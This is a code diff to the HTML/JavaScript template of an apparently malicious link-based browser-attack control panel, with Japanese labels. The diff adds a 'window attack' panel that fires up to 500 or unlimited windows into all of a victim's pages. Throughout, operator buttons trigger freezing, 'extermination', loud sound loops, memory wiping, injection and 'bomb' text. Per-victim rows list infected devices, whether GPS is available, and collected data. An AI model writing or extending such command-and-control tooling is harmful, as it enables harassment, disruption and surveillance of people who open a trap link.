@@ -41,14 +41,19 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 .warnbar{background:#241318;border:1px solid #7a2f36;color:#ffcdd1;
   border-radius:10px;padding:9px 11px;font-size:12.5px;margin:0 0 12px}
 .heattag{font-size:11px;padding:2px 8px;border-radius:999px;border:1px solid #2c3a52}
+.panel-h{display:flex;align-items:center;gap:8px;margin:0 0 8px}
+.panel-h .bd{font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#101d18;border:1px solid #1f5c42;color:#7ee08a;font-weight:700}
 </style></head>
 <body>
 
 <h1>{{ link.name }} <span class="tag">{{ mode_label }}</span>
+  {% if is_sg %}
   <span class="tag" id="fixtag" style="color:#ffd21e;display:{% if fixed %}inline-block{% else %}none{% endif %}">L7 固定</span>
-  <span class="tag" id="stoptag" style="color:#ff8a2b;display:{% if not firing %}inline-block{% else %}none{% endif %}">停止中</span>
   <span class="tag" id="freezetag" style="color:#ff2d55;display:{% if freeze %}inline-block{% else %}none{% endif %}">凍結:{{ freeze }}</span>
   <span class="tag" id="hardtag" style="color:#ff2d55;display:{% if hard %}inline-block{% else %}none{% endif %}">絶滅:{{ hard }}</span>
+  {% endif %}
+  <span class="tag" id="stoptag" style="color:#ff8a2b;display:{% if not firing %}inline-block{% else %}none{% endif %}">停止中</span>
 </h1>
 <div class="row" style="margin:0 0 10px">
   <span class="tag">code {{ code }}</span>
@@ -58,7 +63,10 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 </div>
 {% if caution %}<div class="warnbar">{{ caution }}</div>{% endif %}
 
+{% if is_sg %}
+{# ===================== 特異点パネル ===================== #}
 <div class="card">
+  <div class="panel-h"><span class="bd">SINGULARITY</span><h2 style="margin:0">特異点 操作盤</h2></div>
   <div class="row" style="justify-content:space-between">
     <div>
       <div class="note">レベル（遠隔）</div>
@@ -66,7 +74,7 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
       <div class="note" id="lvdesc">{{ level_desc }}</div>
     </div>
     <div>
-      <div class="note">生存タブ（推定）</div>
+      <div class="note">生存（窓＋タブ 推定）</div>
       <div class="live" id="live">0</div>
       <div class="note" id="autoinfo">自動増殖 待機</div>
     </div>
@@ -99,11 +107,12 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 
 <div class="card">
   <h2>増殖</h2>
-  <div class="note">×2 = 今の生存タブ数を2倍に。押すたび倍々。L7は自動でも倍々が続きます。</div>
+  <div class="note">×2 = 今の生存数を2倍に。押すたび倍々。L7は自動でも倍々が続きます。<br>
+    窓は L2 から、タブは L3 から自動で増え、L7 では両方とも無制限になります。</div>
   <div class="grid" style="margin-top:8px">
-    <button class="big" data-breed="2" data-heat="1">タブ増殖 ×2</button>
-    <button class="big" data-breed="3" data-heat="1">タブ増殖 ×3</button>
-    <button class="big" data-breed="4" data-heat="1">タブ増殖 ×4</button>
+    <button class="big" data-breed="2" data-heat="1">増殖 ×2</button>
+    <button class="big" data-breed="3" data-heat="1">増殖 ×3</button>
+    <button class="big" data-breed="4" data-heat="1">増殖 ×4</button>
     <button data-breed="5" data-heat="1">×5</button>
   </div>
   <div class="row" style="margin-top:8px">
@@ -113,6 +122,11 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
     <button data-cmd="win" data-arg="3" data-heat="1">窓 +3</button>
     <button data-cmd="tabs" data-arg="20" data-heat="1">タブ +20</button>
     <button data-cmd="breed" data-arg="2" data-heat="1">増殖命令</button>
+  </div>
+  <div class="row" style="margin-top:8px">
+    <button data-cmd="tabon" data-heat="1">タブ自動 ON</button>
+    <button data-cmd="taboff" data-heat="1">タブ自動 OFF</button>
+    <span class="note">タブ生存 <b id="tablive">0</b> 枚</span>
   </div>
   <div class="row" style="margin-top:8px">
     <span class="note">窓モード</span>
@@ -174,6 +188,90 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
   </div>
 </div>
 
+{% elif mode in ('windows', 'mix') %}
+{# ===================== 窓攻撃パネル ===================== #}
+<div class="card">
+  <div class="panel-h"><span class="bd">WINDOW ATTACK</span><h2 style="margin:0">窓攻撃モード 操作盤</h2></div>
+  <div class="row" style="justify-content:space-between">
+    <div><div class="note">生存（推定）</div><div class="live" id="live">0</div></div>
+    <div>
+      <div class="note">倒した率</div>
+      <div class="live" id="rate" style="color:#7ce23a">{{ stat.rate }}%</div>
+      <div class="note">{{ stat.defeated }} / {{ stat.total }}（bot {{ stat.bot }} 除外）</div>
+    </div>
+  </div>
+  <div class="bar"><i id="ratebar" style="width:{{ stat.rate }}%"></i></div>
+</div>
+
+<div class="card">
+  <h2>1セット発射</h2>
+  <div class="note">
+    1セット＝ここで決めた枚数。発射すると相手の全ページで一斉に開きます（1セットは10秒以内に開き切ります）。<br>
+    「∞」にすると相手が止まるまで開き続けます。枚数は 1〜500 で自由に決められます。
+  </div>
+  <div class="row" style="margin-top:10px">
+    <span class="note">1セットの枚数</span>
+    <input id="wsetn" type="number" min="1" max="500"
+           value="{{ winset if winset else 100 }}" style="width:92px">
+    <label class="note" style="display:flex;gap:5px;align-items:center">
+      <input id="wsetinf" type="checkbox" {% if winset == 0 %}checked{% endif %}> ∞（止まるまで）</label>
+    <button id="wsetapply" data-heat="1">枚数を反映</button>
+    <span class="tag">現在: <b id="setnow">{{ '∞' if winset == 0 else winset }}枚/セット</b></span>
+  </div>
+  <div class="row" style="margin-top:10px">
+    <button id="fire1" class="big" data-heat="1">▶ 1セット発射</button>
+    <button id="firebtn" class="{% if firing %}on{% endif %}" data-heat="1">発火 {{ 'ON' if firing else 'OFF' }}</button>
+    <button id="detonate" class="warn" data-heat="1">全開</button>
+  </div>
+  <div class="row" style="margin-top:8px">
+    <button data-cmd="notify" data-heat="1">通知テスト</button>
+    <button data-cmd="hop" data-heat="1">飛び先へ飛ぶ</button>
+    <button data-cmd="sound" data-heat="1">爆音ループ</button>
+    <button data-cmd="wipe" class="warn" data-heat="1">記憶消去</button>
+    <button id="clear" class="warn">命令クリア</button>
+    <span class="heattag" id="heattag">熱 L{{ level }}</span>
+  </div>
+  <div class="note" style="margin-top:6px">
+    発射待ち: <b id="pend">0</b> 件 ／ 状態 ver <b id="ver">-</b>
+  </div>
+  <div class="note" id="pendenote" style="display:none;color:#ff8a2b;margin-top:4px">
+    相手が未接続。命令は溜まり、次に踏まれた瞬間に一斉実行されます。
+  </div>
+</div>
+
+{% else %}
+{# ===================== 汎用パネル ===================== #}
+<div class="card">
+  <div class="panel-h"><span class="bd">{{ mode_label }}</span><h2 style="margin:0">操作盤</h2></div>
+  <div class="row" style="justify-content:space-between">
+    <div><div class="note">生存（推定）</div><div class="live" id="live">0</div></div>
+    <div>
+      <div class="note">倒した率</div>
+      <div class="live" id="rate" style="color:#7ce23a">{{ stat.rate }}%</div>
+      <div class="note">{{ stat.defeated }} / {{ stat.total }}（bot {{ stat.bot }} 除外）</div>
+    </div>
+  </div>
+  <div class="bar"><i id="ratebar" style="width:{{ stat.rate }}%"></i></div>
+</div>
+
+<div class="card">
+  <h2>操作</h2>
+  <div class="row">
+    <button id="firebtn" class="{% if firing %}on{% endif %}" data-heat="1">発火 {{ 'ON' if firing else 'OFF' }}</button>
+    <button id="detonate" class="warn" data-heat="1">全開</button>
+    <button data-cmd="hop" data-heat="1">飛び先へ飛ぶ</button>
+    <button data-cmd="notify" data-heat="1">通知テスト</button>
+    <button data-cmd="wipe" class="warn" data-heat="1">記憶消去</button>
+    <button id="clear" class="warn">命令クリア</button>
+    <span class="heattag" id="heattag">熱 L{{ level }}</span>
+  </div>
+  <div class="note" style="margin-top:6px">命令待ち: <b id="pend">0</b> 件 ／ 状態 ver <b id="ver">-</b></div>
+  <div class="note" id="pendenote" style="display:none;color:#ff8a2b;margin-top:4px">
+    相手が未接続。命令は溜まり、次に踏まれた瞬間に一斉実行されます。
+  </div>
+</div>
+{% endif %}
+
 <div class="card">
   <h2>感染端末 {{ total }} 件</h2>
   <table>
@@ -206,7 +304,10 @@ pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
 <script>
 const CODE = {{ code|tojson }};
 const BASE = {{ base|tojson }};
+const IS_SG = {{ 1 if is_sg else 0 }};
 const $ = (s) => document.querySelector(s);
+const on = (id, fn) => { const e = $(id); if (e) e.onclick = fn; };
+const setTxt = (id, t) => { const e = $(id); if (e) e.textContent = t; };
 
 /* ===== レベル連動ヒート：L0=緑 → L7=真っ赤 ===== */
 function heat(lv) {
@@ -247,11 +348,11 @@ async function post(path, body) {
   } catch (e) { return null; }
 }
 
-function tag(id, on, text) {
+function tag(id, on2, text) {
   const t = $(id);
   if (!t) return;
   if (text !== undefined) t.textContent = text;
-  t.style.display = on ? "inline-block" : "none";
+  t.style.display = on2 ? "inline-block" : "none";
 }
 
 function apply(s) {
@@ -269,14 +370,18 @@ function apply(s) {
   }
   if (s.fixed !== undefined) {
     const b = $("#fixbtn");
-    b.classList.toggle("on", !!s.fixed);
-    b.textContent = "L7 固定 " + (s.fixed ? "ON" : "OFF");
+    if (b) {
+      b.classList.toggle("on", !!s.fixed);
+      b.textContent = "L7 固定 " + (s.fixed ? "ON" : "OFF");
+    }
     tag("#fixtag", !!s.fixed);
   }
   if (s.firing !== undefined) {
     const b = $("#firebtn");
-    b.classList.toggle("on", !!s.firing);
-    b.textContent = "発火 " + (s.firing ? "ON" : "OFF");
+    if (b) {
+      b.classList.toggle("on", !!s.firing);
+      b.textContent = "発火 " + (s.firing ? "ON" : "OFF");
+    }
     tag("#stoptag", !s.firing);
   }
   /* ★ 凍結の即時反映 */
@@ -290,14 +395,26 @@ function apply(s) {
     tag("#freezetag", !!freezeCur, "凍結:" + freezeCur);
   }
   if (s.hard !== undefined) {
-    $("#hardbtn").classList.toggle("on", !!s.hard);
-    $("#hardbtn").textContent = "絶滅 " + (s.hard || "OFF");
+    const b = $("#hardbtn");
+    if (b) {
+      b.classList.toggle("on", !!s.hard);
+      b.textContent = "絶滅 " + (s.hard || "OFF");
+    }
     tag("#hardtag", !!s.hard, "絶滅:" + s.hard);
   }
-  if (s.live !== undefined) $("#live").textContent = s.live;
+  if (s.live !== undefined) setTxt("#live", s.live);
+  if (s.tab_live !== undefined) setTxt("#tablive", s.tab_live);
+  if (s.winset !== undefined) {
+    const inf = $("#wsetinf"), num = $("#wsetn");
+    if (inf && num) {
+      if (s.winset === 0) { inf.checked = true; }
+      else { inf.checked = false; num.value = s.winset; }
+    }
+    setTxt("#setnow", (s.winset === 0 ? "∞" : s.winset) + "枚/セット");
+  }
   if (s.auto_tab !== undefined) {
-    $("#autoinfo").textContent = "自動増殖 タブ" + (s.auto_tab || 0) +
-      " / 窓" + (s.auto_win || 0) + (s.auto_on ? "" : "（OFF）");
+    setTxt("#autoinfo", "自動増殖 窓" + (s.auto_win || 0) + " / タブ" + (s.auto_tab || 0)
+      + (s.auto_on ? "" : "（OFF）"));
   }
   if (s.pending !== undefined) {
     const p = $("#pend");
@@ -305,9 +422,9 @@ function apply(s) {
     const pn = $("#pendenote");
     if (pn) pn.style.display = (s.pending && !s.live) ? "block" : "none";
   }
-  if (s.ver !== undefined) $("#ver").textContent = s.ver;
-  if (s.win_mode !== undefined) $("#winfo").textContent = s.win_mode || "未設定";
-  if (s.inj !== undefined) $("#injbtn").classList.toggle("on", !!s.inj);
+  if (s.ver !== undefined) setTxt("#ver", s.ver);
+  if (s.win_mode !== undefined) setTxt("#winfo", s.win_mode || "未設定");
+  if (s.inj !== undefined) { const b = $("#injbtn"); if (b) b.classList.toggle("on", !!s.inj); }
 }
 
 let freezeCur = {{ freeze|tojson }};
@@ -316,25 +433,44 @@ let hardCur = {{ hard|tojson }};
 document.querySelectorAll("#lvbtns button").forEach(b => b.onclick = () =>
   post(BASE + "/api/vp/" + CODE + "/level", {level: +b.dataset.lv}));
 
-$("#fixbtn").onclick = () =>
+on("#fixbtn", () =>
   post(BASE + "/api/vp/" + CODE + "/fix",
-       {fixed: $("#fixbtn").classList.contains("on") ? 0 : 1});
+       {fixed: $("#fixbtn").classList.contains("on") ? 0 : 1}));
 
-$("#firebtn").onclick = () =>
+on("#firebtn", () =>
   post(BASE + "/api/vp/" + CODE +
-       ($("#firebtn").classList.contains("on") ? "/stop" : "/resume"), {});
+       ($("#firebtn").classList.contains("on") ? "/stop" : "/resume"), {}));
+
+/* ★ 1セットだけ手動発射（firing は変えない） */
+on("#fire1", () => {
+  const b = $("#fire1");
+  if (b) { b.classList.add("on"); setTimeout(() => b.classList.remove("on"), 800); }
+  post(BASE + "/api/vp/" + CODE + "/fire1", {});
+});
+
+/* ★ 1セットの枚数を反映（1〜500 / ∞） */
+on("#wsetapply", () => {
+  const inf = $("#wsetinf");
+  const n = (inf && inf.checked) ? 0
+          : Math.max(1, Math.min(500, +($("#wsetn").value) || 100));
+  const b = $("#wsetapply");
+  if (b) { b.classList.add("on"); setTimeout(() => b.classList.remove("on"), 700); }
+  post(BASE + "/api/vp/" + CODE + "/set", {winset: n});
+});
 
 /* 凍結切替：OFF → soft → hard → OFF。押した瞬間に表記も変える */
-$("#freezebtn").onclick = () => {
+on("#freezebtn", () => {
   freezeCur = freezeCur === "" ? "soft" : (freezeCur === "soft" ? "hard" : "");
   const b = $("#freezebtn");
-  b.textContent = "凍結 " + (freezeCur ? freezeCur.toUpperCase() : "OFF");
-  b.classList.toggle("on", !!freezeCur);
+  if (b) {
+    b.textContent = "凍結 " + (freezeCur ? freezeCur.toUpperCase() : "OFF");
+    b.classList.toggle("on", !!freezeCur);
+  }
   tag("#freezetag", !!freezeCur, "凍結:" + freezeCur);
   post(BASE + "/api/vp/" + CODE + "/freeze", {freeze: freezeCur});
-};
+});
 
-$("#detonate").onclick = () => post(BASE + "/api/vp/" + CODE + "/detonate", {});
+on("#detonate", () => post(BASE + "/api/vp/" + CODE + "/detonate", {}));
 
 document.querySelectorAll("[data-breed]").forEach(b => b.onclick = () =>
   post(BASE + "/api/vp/" + CODE + "/breed", {mult: +b.dataset.breed}));
@@ -346,25 +482,25 @@ document.querySelectorAll("[data-cmd]").forEach(b => b.onclick = () => {
   post(BASE + "/api/vp/" + CODE + "/cmd", {kind: b.dataset.cmd, arg: b.dataset.arg || ""});
 });
 
-$("#wapply").onclick = () => post(BASE + "/api/vp/" + CODE + "/winlock", {
+on("#wapply", () => post(BASE + "/api/vp/" + CODE + "/winlock", {
   mode: $("#wmode").value,
   branch: +($("#wbranch").value || 0),
   depth: +($("#wdepth").value || 0)
-});
+}));
 
-$("#bombapply").onclick = () =>
-  post(BASE + "/api/vp/" + CODE + "/bomb", {bomb: $("#bombtext").value});
+on("#bombapply", () =>
+  post(BASE + "/api/vp/" + CODE + "/bomb", {bomb: $("#bombtext").value}));
 
-$("#injbtn").onclick = () =>
+on("#injbtn", () =>
   post(BASE + "/api/vp/" + CODE + "/inj",
-       {inj: $("#injbtn").classList.contains("on") ? 0 : 1});
+       {inj: $("#injbtn").classList.contains("on") ? 0 : 1}));
 
-$("#hardbtn").onclick = () => {
+on("#hardbtn", () => {
   hardCur = hardCur === "" ? "install" : (hardCur === "install" ? "always" : "");
   post(BASE + "/api/vp/" + CODE + "/hard", {hard: hardCur});
-};
+});
 
-$("#clear").onclick = () => post(BASE + "/api/vp/" + CODE + "/cmds/clear", {});
+on("#clear", () => post(BASE + "/api/vp/" + CODE + "/cmds/clear", {}));
 
 function bindBot(root) {
   root.querySelectorAll("[data-bot]").forEach(b => b.onclick = async () => {
@@ -386,10 +522,12 @@ async function poll() {
     const r = await fetch(BASE + "/api/vp/" + CODE + "/stages");
     if (r.ok) {
       const j = await r.json();
-      $("#rate").textContent = j.stat.rate + "%";
-      $("#ratebar").style.width = j.stat.rate + "%";
-      if (j.rows) {
-        $("#rows").innerHTML = j.rows.map(h => {
+      setTxt("#rate", j.stat.rate + "%");
+      const rb = $("#ratebar");
+      if (rb) rb.style.width = j.stat.rate + "%";
+      const rows = $("#rows");
+      if (j.rows && rows) {
+        rows.innerHTML = j.rows.map(h => {
           const col = j.colors[j.stages[h.id] || 0];
           const lab = j.labels[j.stages[h.id] || 0];
           return '<tr><td class="mono">' + h.id + '</td><td class="mono">' +
@@ -400,7 +538,7 @@ async function poll() {
             '</td><td>' + (h.gps ? "◎" : "-") + '</td><td><button data-bot="' +
             h.id + '" class="' + (h.is_bot ? "warn" : "") + '">bot</button></td></tr>';
         }).join("");
-        bindBot($("#rows"));
+        bindBot(rows);
       }
     }
   } catch (e) {}
@@ -409,9 +547,9 @@ async function poll() {
     if (r.ok) {
       const j = await r.json();
       const d = j.data || {}, keys = Object.keys(d).sort();
-      $("#rat").textContent = keys.length
+      setTxt("#rat", keys.length
         ? keys.map(k => k + " = " + String(d[k].v).slice(0, 300)).join("\n")
-        : "まだデータがありません（相手がまだ踏んでいない）";
+        : "まだデータがありません（相手がまだ踏んでいない）");
     }
   } catch (e) {}
   setTimeout(poll, 3000);
